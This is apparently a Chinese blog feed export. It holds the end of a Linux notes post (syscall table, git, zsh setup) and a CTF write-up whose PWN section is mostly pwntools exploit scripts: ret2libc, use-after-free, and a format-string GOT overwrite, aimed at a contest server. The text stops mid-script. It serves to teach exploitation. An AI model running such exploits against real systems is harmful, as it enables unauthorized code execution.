class="table-container"><table><thead><tr><th>系统调用</th><th>调用号</th><th>系统调用</th><th>调用号</th></tr></thead><tbody><tr><td>read</td><td>0</td><td>write</td><td>1</td></tr><tr><td>open</td><td>2</td><td>close</td><td>3</td></tr><tr><td>stat</td><td>4</td><td>fstat</td><td>5</td></tr><tr><td>lstat</td><td>6</td><td>poll</td><td>7</td></tr><tr><td>lseek</td><td>8</td><td>mmap</td><td>9</td></tr><tr><td>mprotect</td><td>10</td><td>munmap</td><td>11</td></tr><tr><td>brk</td><td>12</td><td>rt_sigaction</td><td>13</td></tr><tr><td>rt_sigprocmask</td><td>14</td><td>rt_sigreturn</td><td>15</td></tr><tr><td>ioctl</td><td>16</td><td>pread64</td><td>17</td></tr><tr><td>pwrite64</td><td>18</td><td>readv</td><td>19</td></tr><tr><td>writev</td><td>20</td><td>access</td><td>21</td></tr><tr><td>pipe</td><td>22</td><td>select</td><td>23</td></tr><tr><td>sched_yield</td><td>24</td><td>mremap</td><td>25</td></tr><tr><td>msync</td><td>26</td><td>mincore</td><td>27</td></tr><tr><td>madvise</td><td>28</td><td>shmget</td><td>29</td></tr><tr><td>shmat</td><td>30</td><td>shmctl</td><td>31</td></tr><tr><td>dup</td><td>32</td><td>dup2</td><td>33</td></tr><tr><td>pause</td><td>34</td><td>nanosleep</td><td>35</td></tr><tr><td>getitimer</td><td>36</td><td>alarm</td><td>37</td></tr><tr><td>setitimer</td><td>38</td><td>getpid</td><td>39</td></tr><tr><td>sendfile</td><td>40</td><td>socket</td><td>41</td></tr><tr><td>connect</td><td>42</td><td>accept</td><td>43</td></tr><tr><td>sendto</td><td>44</td><td>recvfrom</td><td>45</td></tr><tr><td>sendmsg</td><td>46</td><td>recvmsg</td><td>47</td></tr><tr><td>shutdown</td><td>48</td><td>bind</td><td>49</td></tr><tr><td>listen</td><td>50</td><td>getsockname</td><td>51</td></tr><tr><td>getpeername</td><td>52</td><td>socketpair</td><td>53</td></tr><tr><td>setsockopt</td><td>54</td><td>getsockopt</td><td>55</td></tr><tr><td>clone</td><td>56</td><td>fork</td><td>57</td></tr><tr><td>vfork</td><td>58</td><td>execve</td><td>59</td></tr><tr><td>exit</td><td>60</td><td>wait4</td><td>61</td></tr><tr><td>kill</td><td>62</td><td>uname</td><td>63</td></tr><tr><td>semget</td><td>64</td><td>semop</td><td>65</td></tr><tr><td>semctl</td><td>66</td><td>shmdt</td><td>67</td></tr><tr><td>msgget</td><td>68</td><td>msgsnd</td><td>69</td></tr><tr><td>msgrcv</td><td>70</td><td>msgctl</td><td>71</td></tr><tr><td>fcntl</td><td>72</td><td>flock</td><td>73</td></tr><tr><td>fsync</td><td>74</td><td>fdatasync</td><td>75</td></tr><tr><td>truncate</td><td>76</td><td>ftruncate</td><td>77</td></tr><tr><td>getdents</td><td>78</td><td>getcwd</td><td>79</td></tr><tr><td>chdir</td><td>80</td><td>fchdir</td><td>81</td></tr><tr><td>rename</td><td>82</td><td>mkdir</td><td>83</td></tr><tr><td>rmdir</td><td>84</td><td>creat</td><td>85</td></tr><tr><td>link</td><td>86</td><td>unlink</td><td>87</td></tr><tr><td>symlink</td><td>88</td><td>readlink</td><td>89</td></tr><tr><td>chmod</td><td>90</td><td>fchmod</td><td>91</td></tr><tr><td>chown</td><td>92</td><td>fchown</td><td>93</td></tr><tr><td>lchown</td><td>94</td><td>umask</td><td>95</td></tr><tr><td>gettimeofday</td><td>96</td><td>getrlimit</td><td>97</td></tr><tr><td>getrusage</td><td>98</td><td>sysinfo</td><td>99</td></tr><tr><td>times</td><td>100</td><td>ptrace</td><td>101</td></tr><tr><td>getuid</td><td>102</td><td>syslog</td><td>103</td></tr><tr><td>getgid</td><td>104</td><td>setuid</td><td>105</td></tr><tr><td>setgid</td><td>106</td><td>geteuid</td><td>107</td></tr><tr><td>getegid</td><td>108</td><td>setpgid</td><td>109</td></tr><tr><td>getppid</td><td>110</td><td>getpgrp</td><td>111</td></tr><tr><td>setsid</td><td>112</td><td>setreuid</td><td>113</td></tr><tr><td>setregid</td><td>114</td><td>getgroups</td><td>115</td></tr><tr><td>setgroups</td><td>116</td><td>setresuid</td><td>117</td></tr><tr><td>getresuid</td><td>118</td><td>setresgid</td><td>119</td></tr><tr><td>getresgid</td><td>120</td><td>getpgid</td><td>121</td></tr><tr><td>setfsuid</td><td>122</td><td>setfsgid</td><td>123</td></tr><tr><td>getsid</td><td>124</td><td>capget</td><td>125</td></tr><tr><td>capset</td><td>126</td><td>rt_sigpending</td><td>127</td></tr><tr><td>rt_sigtimedwait</td><td>128</td><td>rt_sigqueueinfo</td><td>129</td></tr><tr><td>rt_sigsuspend</td><td>130</td><td>sigaltstack</td><td>131</td></tr><tr><td>utime</td><td>132</td><td>mknod</td><td>133</td></tr><tr><td>uselib</td><td>13</td><td>4personality</td><td>135</td></tr><tr><td>ustat</td><td>136</td><td>statfs</td><td>137</td></tr><tr><td>fstatfs</td><td>138</td><td>sysfs</td><td>139</td></tr><tr><td>getpriority</td><td>140</td><td>setpriority</td><td>141</td></tr><tr><td>sched_setparam</td><td>142</td><td>sched_getparam</td><td>143</td></tr><tr><td>sched_setscheduler</td><td>144</td><td>sched_getscheduler</td><td>145</td></tr><tr><td>sched_get_priority_max</td><td>146</td><td>sched_get_priority_min</td><td>147</td></tr><tr><td>sched_rr_get_interval</td><td>148</td><td>mlock</td><td>149</td></tr><tr><td>munlock</td><td>150</td><td>mlockall</td><td>151</td></tr><tr><td>munlockall</td><td>152</td><td>vhangup</td><td>153</td></tr><tr><td>modify_ldt</td><td>154</td><td>pivot_root</td><td>155</td></tr><tr><td>_sysctl</td><td>156</td><td>prctl</td><td>157</td></tr><tr><td>arch_prctl</td><td>158</td><td>adjtimex</td><td>159</td></tr><tr><td>setrlimit</td><td>160</td><td>chroot</td><td>161</td></tr><tr><td>sync</td><td>162</td><td>acct</td><td>163</td></tr><tr><td>settimeofday</td><td>164</td><td>mount</td><td>165</td></tr><tr><td>umount2</td><td>166</td><td>swapon</td><td>167</td></tr><tr><td>swapoff</td><td>168</td><td>reboot</td><td>169</td></tr><tr><td>sethostname</td><td>170</td><td>setdomainname</td><td>171</td></tr><tr><td>iopl</td><td>172</td><td>ioperm</td><td>173</td></tr><tr><td>create_module</td><td>174</td><td>init_module</td><td>175</td></tr><tr><td>delete_module</td><td>176</td><td>get_kernel_syms</td><td>177</td></tr><tr><td>query_module</td><td>178</td><td>quotactl</td><td>179</td></tr><tr><td>nfsservctl</td><td>180</td><td>getpmsg</td><td>181</td></tr><tr><td>putpmsg</td><td>182</td><td>afs_syscall</td><td>183</td></tr><tr><td>tuxcall</td><td>184</td><td>security</td><td>185</td></tr><tr><td>gettid</td><td>186</td><td>readahead</td><td>187</td></tr><tr><td>setxattr</td><td>188</td><td>lsetxattr</td><td>189</td></tr><tr><td>fsetxattr</td><td>190</td><td>getxattr</td><td>191</td></tr><tr><td>lgetxattr</td><td>192</td><td>fgetxattr</td><td>193</td></tr><tr><td>listxattr</td><td>194</td><td>llistxattr</td><td>195</td></tr><tr><td>flistxattr</td><td>196</td><td>removexattr</td><td>197</td></tr><tr><td>lremovexattr</td><td>198</td><td>fremovexattr</td><td>199</td></tr><tr><td>tkill</td><td>200</td><td>time</td><td>201</td></tr><tr><td>futex</td><td>202</td><td>sched_setaffinity</td><td>203</td></tr><tr><td>sched_getaffinity</td><td>204</td><td>set_thread_area</td><td>205</td></tr><tr><td>io_setup</td><td>206</td><td>io_destroy</td><td>207</td></tr><tr><td>io_getevents</td><td>208</td><td>io_submit</td><td>209</td></tr><tr><td>io_cancel</td><td>210</td><td>get_thread_area</td><td>211</td></tr><tr><td>lookup_dcookie</td><td>212</td><td>epoll_create</td><td>213</td></tr><tr><td>epoll_ctl_old</td><td>214</td><td>epoll_wait_old</td><td>215</td></tr><tr><td>remap_file_pages</td><td>216</td><td>getdents64</td><td>217</td></tr><tr><td>set_tid_address</td><td>218</td><td>restart_syscall</td><td>219</td></tr><tr><td>semtimedop</td><td>220</td><td>fadvise64</td><td>221</td></tr><tr><td>timer_create</td><td>222</td><td>timer_settime</td><td>223</td></tr><tr><td>timer_gettime</td><td>224</td><td>timer_getoverrun</td><td>225</td></tr><tr><td>timer_delete</td><td>226</td><td>clock_settime</td><td>227</td></tr><tr><td>clock_gettime</td><td>228</td><td>clock_getres</td><td>229</td></tr><tr><td>clock_nanosleep</td><td>230</td><td>exit_group</td><td>231</td></tr><tr><td>epoll_wait</td><td>232</td><td>epoll_ctl</td><td>233</td></tr><tr><td>tgkill</td><td>234</td><td>utimes</td><td>235</td></tr><tr><td>vserver</td><td>236</td><td>mbind</td><td>237</td></tr><tr><td>set_mempolicy</td><td>238</td><td>get_mempolicy</td><td>239</td></tr><tr><td>mq_open</td><td>240</td><td>mq_unlink</td><td>241</td></tr><tr><td>mq_timedsend</td><td>242</td><td>mq_timedreceive</td><td>243</td></tr><tr><td>mq_notify</td><td>244</td><td>mq_getsetattr</td><td>245</td></tr><tr><td>kexec_load</td><td>246</td><td>waitid</td><td>247</td></tr><tr><td>add_key</td><td>248</td><td>request_key</td><td>249</td></tr><tr><td>keyctl</td><td>250</td><td>ioprio_set</td><td>251</td></tr><tr><td>ioprio_get</td><td>252</td><td>inotify_init</td><td>253</td></tr><tr><td>inotify_add_watch</td><td>254</td><td>inotify_rm_watch</td><td>255</td></tr><tr><td>migrate_pages</td><td>256</td><td>openat</td><td>257</td></tr><tr><td>mkdirat</td><td>258</td><td>mknodat</td><td>259</td></tr><tr><td>fchownat</td><td>260</td><td>futimesat</td><td>261</td></tr><tr><td>newfstatat</td><td>262</td><td>unlinkat</td><td>263</td></tr><tr><td>renameat</td><td>264</td><td>linkat</td><td>265</td></tr><tr><td>symlinkat</td><td>266</td><td>readlinkat</td><td>267</td></tr><tr><td>fchmodat</td><td>268</td><td>faccessat</td><td>269</td></tr><tr><td>pselect6</td><td>270</td><td>ppoll</td><td>271</td></tr><tr><td>unshare</td><td>272</td><td>set_robust_list</td><td>273</td></tr><tr><td>get_robust_list</td><td>274</td><td>splice</td><td>275</td></tr><tr><td>tee</td><td>276</td><td>sync_file_range</td><td>277</td></tr><tr><td>vmsplice</td><td>278</td><td>move_pages</td><td>279</td></tr><tr><td>utimensat</td><td>280</td><td>epoll_pwait</td><td>281</td></tr><tr><td>signalfd</td><td>282</td><td>timerfd_create</td><td>283</td></tr><tr><td>eventfd</td><td>284</td><td>fallocate</td><td>285</td></tr><tr><td>timerfd_settime</td><td>286</td><td>timerfd_gettime</td><td>287</td></tr><tr><td>accept4</td><td>288</td><td>signalfd4</td><td>289</td></tr><tr><td>eventfd2</td><td>290</td><td>epoll_create1</td><td>291</td></tr><tr><td>dup3</td><td>292</td><td>pipe2</td><td>293</td></tr><tr><td>inotify_init1</td><td>294</td><td>preadv</td><td>295</td></tr><tr><td>pwritev</td><td>296</td><td>rt_tgsigqueueinfo</td><td>297</td></tr><tr><td>perf_event_open</td><td>298</td><td>recvmmsg</td><td>299</td></tr><tr><td>fanotify_init</td><td>300</td><td>fanotify_mark</td><td>301</td></tr><tr><td>prlimit64</td><td>302</td><td>name_to_handle_at</td><td>303</td></tr><tr><td>open_by_handle_at</td><td>304</td><td>clock_adjtime</td><td>305</td></tr><tr><td>syncfs</td><td>306</td><td>sendmmsg</td><td>307</td></tr><tr><td>set_ns</td><td>308</td><td>get_cpu</td><td>309</td></tr><tr><td>process_vm_readv</td><td>310</td><td>process_vm_writev</td><td>311</td></tr></tbody></table></div><h2 id="3-git提交"><a href="#3-git提交" class="headerlink" title="3.git提交"></a>3.git提交</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git add *</span><br><span class="line">git remote add origin git@github.com:Pz1o&#x2F;My-PWN.git</span><br><span class="line"></span><br><span class="line">git pull --rebase origin master</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><h2 id="4-zsh安装"><a href="#4-zsh安装" class="headerlink" title="4.zsh安装"></a>4.zsh安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git -y &amp;&amp; git clone https:&#x2F;&#x2F;gitee.com&#x2F;JonahXie&#x2F;oh-my-zsh.git &amp;&amp; .&#x2F;oh-my-zsh&#x2F;tools&#x2F;install.sh</span><br><span class="line">&#x2F;&#x2F;之后会安装install.sh</span><br><span class="line">&#x2F;&#x2F;建议这里换成 https:&#x2F;&#x2F;gitclone.com&#x2F;github.com&#x2F;robbyrussell&#x2F;oh-my-zsh.git</span><br><span class="line">&#x2F;&#x2F;之后就是换皮和加插件了</span><br><span class="line"></span><br><span class="line">vim .&#x2F;.zshrc</span><br><span class="line">plugins&#x3D;(git</span><br><span class="line">zsh-autosuggestions</span><br><span class="line">zsh-syntax-highlighting</span><br><span class="line">)</span><br><span class="line">git clone https:&#x2F;&#x2F;gitclone.com&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-autosuggestions.git &#x2F;home&#x2F;ubuntu&#x2F;oh-my-zsh&#x2F;custom&#x2F;plugins&#x2F;zsh-autosuggestions</span><br><span class="line">git clone https:&#x2F;&#x2F;gitclone.com&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-syntax-highlighting.git &#x2F;home&#x2F;ubuntu&#x2F;oh-my-zsh&#x2F;custom&#x2F;plugins&#x2F;zsh-syntax-highlighting</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;如果想用agnoster</span><br><span class="line">sudo apt-get install fonts-powerline</span><br><span class="line">&#x2F;&#x2F;这边建议用random</span><br></pre></td></tr></table></figure><h2 id="5-宝塔问题"><a href="#5-宝塔问题" class="headerlink" title="5.宝塔问题"></a>5.宝塔问题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;bt default</span><br></pre></td></tr></table></figure><h2 id="6-directorylister"><a href="#6-directorylister" class="headerlink" title="6.directorylister"></a>6.directorylister</h2><p>先安装php7.2</p><p>直接上宝塔安装就可以</p><p>然后上[网站][<a href="https://www.directorylister.com/]下载解压" target="_blank" rel="noopener">https://www.directorylister.com/]下载解压</a></p><p>根据这篇[文章][<a href="https://blog.chrxw.com/archives/2020/09/21/1401.html]来就可以" target="_blank" rel="noopener">https://blog.chrxw.com/archives/2020/09/21/1401.html]来就可以</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opcache</span><br><span class="line">&#x2F;&#x2F;这个扩展得下载</span><br></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;主要记录一些基础的linux知识&lt;/p&gt;
&lt;h1 id=&quot;0x01-安装PWN环境&quot;&gt;&lt;a href=&quot;#0x01-安装PWN环境&quot; class=&quot;headerlink&quot; title=&quot;0x01 安装PWN环境&quot;&gt;&lt;/a&gt;0x01 安装PWN环境&lt;/h1&gt;&lt;p&gt;这里主要记录</summary>
      
    
    
    
    <category term="linux" scheme="https://pz1o.top/categories/linux/"/>
    
    
    <category term="linux" scheme="https://pz1o.top/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTF2020岁末赛</title>
    <link href="https://pz1o.top/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/"/>
    <id>https://pz1o.top/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/</id>
    <published>2020-12-26T14:32:03.000Z</published>
    <updated>2021-03-03T07:23:38.592Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CUMTCTF2020岁末赛"><a href="#CUMTCTF2020岁末赛" class="headerlink" title="CUMTCTF2020岁末赛"></a>CUMTCTF2020岁末赛</h1><p>学长们可太搞了，比赛最后垂直上分可太秀了</p><p><img src="/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/image-20201226220723157.png" alt="image-20201226220723157"></p><p>只放PWN的题解了</p><p>下面几个题先放题解，等期末考完试来复现</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h2><p>\x00截断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn1"</span>)</span><br><span class="line">p = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"\x00"</span>*<span class="number">7</span> + p32(<span class="number">123</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h2><p>在1的基础上puts泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'219.219.61.234'</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#r = process("./pwn2")</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context(arch="i386",os="linux")</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'\x00'</span>*<span class="number">7</span> + <span class="string">'\xff'</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">"you_really_know_random_haha"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">put_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">put_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x80486D3</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>) + p32(put_plt) + p32(main) + p32(put_got)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">print(r.recv())</span><br><span class="line">put = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">print(hex(put))</span><br><span class="line"><span class="comment">#libc = LibcSearcher('puts',put)</span></span><br><span class="line"></span><br><span class="line">libcbase = put - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">print(hex(binsh))</span><br><span class="line">sh = libcbase + binsh</span><br><span class="line">payload1 = <span class="string">b'\x00'</span>*<span class="number">7</span> + <span class="string">b'\xff'</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">"you_really_know_random_haha"</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">payload3 = <span class="string">b"A"</span>*(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(system) + p32(<span class="number">0</span>) + p32(sh)</span><br><span class="line"></span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN3"><a href="#PWN3" class="headerlink" title="PWN3"></a>PWN3</h2><p>UAF</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("219.219.61.234",10002)</span></span><br><span class="line">r = process(<span class="string">"./pwn3"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x8048986</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">"AAAA"</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">"BBBB"</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x8</span>,p32(magic))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN4-fail"><a href="#PWN4-fail" class="headerlink" title="PWN4(fail)"></a>PWN4(fail)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pwn4'</span>)</span><br><span class="line">sh = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10003'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn4'</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'a'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">key = <span class="string">'3xpL0r3R'</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(str(key))</span><br><span class="line">payload = <span class="string">'aaaa%77$p'</span><span class="comment">#6</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'aaaa0x'</span>)</span><br><span class="line">libc_base = int(int(sh.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x20840</span>)</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">puts_addr = libc_base + libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">log.success(hex(puts_addr))</span><br><span class="line">gad_get = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">one_addr = libc_base + gad_get[<span class="number">0</span>]</span><br><span class="line">log.success(hex(one_addr))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;puts_got:one_addr&#125;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN5-fail"><a href="#PWN5-fail" class="headerlink" title="PWN5(fail)"></a>PWN5(fail)</h2><p>淦 这个题我以为给的libc就能用 没想到用的是本机的libc简直血亏</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10004</span>)</span><br><span class="line"><span class="comment">#r = process("./pwn5")</span></span><br><span class="line">heap = ELF(<span class="string">'./pwn5'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span 